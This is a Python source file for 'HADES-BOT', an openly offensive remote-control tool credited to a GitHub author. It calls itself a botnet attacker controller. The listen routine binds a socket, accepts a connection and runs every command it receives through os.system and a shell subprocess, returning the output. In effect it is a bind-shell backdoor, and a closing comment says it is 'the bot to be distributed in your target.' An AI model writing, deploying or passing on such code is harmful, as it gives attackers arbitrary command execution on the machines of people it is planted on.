import socket, readline, os, subprocess,argparse,multiprocessing,platform,sys,time
from timeit import default_timer as timer
from datetime import timedelta
from colorama import Fore,init
from colorama import Back as bg
from multiprocessing import Process
parser = argparse.ArgumentParser(description='BotNet Attacker-Main Controller')
parser.add_argument('-ip','--attackerip',metavar='',help='Attacker IP')
parser.add_argument('-p','--port',metavar='',help='Port to listen on')
parser.add_argument('-b','--banner',metavar='',help='Input banner to show banner')
args = parser.parse_args()
init(autoreset=True)
class Controller(object):
    def __init__(self,ip,port,banner):
        self.ip = ip
        self.port = port
        self.banner = banner
    @staticmethod
    def show_banner(s):
        if args.banner != None:
            for c in s + '\n':
                sys.stdout.write(bg.BLACK + Fore.YELLOW + c)
                sys.stdout.flush()
                time.sleep(1.2 / 100)
            time.sleep(1.5)
            print('-----------------------------------------------------------------')
            print(Fore.WHITE + '[' + Fore.GREEN + '+' + Fore.WHITE + ']Made By Droid | Github:https://github.com/FonderElite')
            print('-----------------------------------------------------------------')
            time.sleep(1.5)
        else:
            pass

    def listen(self):
        try:
            server_ip = self.ip
            server_port = self.port
            buffer_values = lambda buff1,buff2 : buff1 * buff2
            buffer_size = buffer_values(10240,1024)
            SEPARATOR = "<sep>"
            s = socket.socket()
            s.bind((server_ip,int(server_port)))
            s.listen(5)
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Starting Listener...")
            time.sleep(1)
            print(f"Listening as {server_ip}:{server_port}...")
            global client_socket,client_address
            client_socket,client_address = s.accept()
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}][{client_address[0]}:{client_address[1]} Connected!")
            time.sleep(1.5)
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
            host = socket.gethostname()
            uid = os.getuid()
            width = 0
            global host_format
            while True:
                    working_directory = os.getcwd()
                    if uid != 0:
                        host_format = '''
{blue}┌──({host_name})-[{cwd}]
{blue}└─$ {white}'''.format(host_name=host,cwd=working_directory,blue=Fore.BLUE,white=Fore.WHITE)
                    elif uid == 0:
                        host_format = '''
{red}┌──(root💀{host_name})-[{cwd}]
{red}└─# {white}'''.format(host_name=host,cwd=working_directory,red=Fore.RED,white=Fore.WHITE)
                    client_socket.send(f'{host_format}'.encode())
                    cmd = client_socket.recv(buffer_size).decode()
                    print(f"{host_format}")
                    os.system(cmd)
                    console = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    client_socket.send(console.stdout.read())
                    client_socket.send(console.stderr.read())
                    #console = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception as Err:
            if Err == "int() argument must be a string, a bytes-like object or a number, not 'NoneType'":
                print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]You cant leave the arguments empty.')
            else:
                print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]{Err}')
            print('\nUsage for help: python3 <hades-bot.py> -h \n')

    @staticmethod
    def time_elapsed():
        start = timer()
        end = timer()
        counter = lambda start_time,end_time : timedelta(seconds=end_time-start_time)
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Time Elapsed: " + str(counter(start,end)) + "s\n")


if __name__ == "__main__":
    main_class = Controller(args.attackerip,args.port,args.banner)
    banner = Process(target=main_class.show_banner,args=('''
  .:'                                  `:.
 ::'                                    `::
:: :.                                  .: ::
 `:. `:.             .             .:'  .:'
   `::. `::          !           ::' .::'
      `::.`::.    .' ! `.    .::'.::'
        `:.  `::::'':!:``::::'   ::'
        :'*:::.  .:' ! `:.  .:::*`:        H A D E S - B O T
       :: HHH::.   ` ! '   .::HHH ::
      ::: `H TH::.  `!'  .::HT H' :::
      ::..  `THHH:`:   :':HHHT'  ..::   Chaos is everywhere, running and hiding isn't gonna help
      `::      `T: `. .' :T'      ::'    only fighting back is your only option to survive.
        `:. .   :         :   . .:'
          `::'               `::'
            :'  .`.  .  .'.  `:
            :' ::.       .:: `:
            :' `:::     :::' `:
            : `.  ``     ''  .'
              :`...........':
              ` :`.     .': '
               |            |
               `:  `"""'  :'
                -.........-
    ''',)) 
    listener = Process(target=main_class.listen)
    time_elapsed = Process(target=main_class.time_elapsed)
    banner.start()
    banner.join()
    listener.start()
    listener.join()
    time_elapsed.start()
    time_elapsed.join()
    #-------------------------------------------------
    #This is the bot to be distributed in your target.
    #-------------------------------------------------
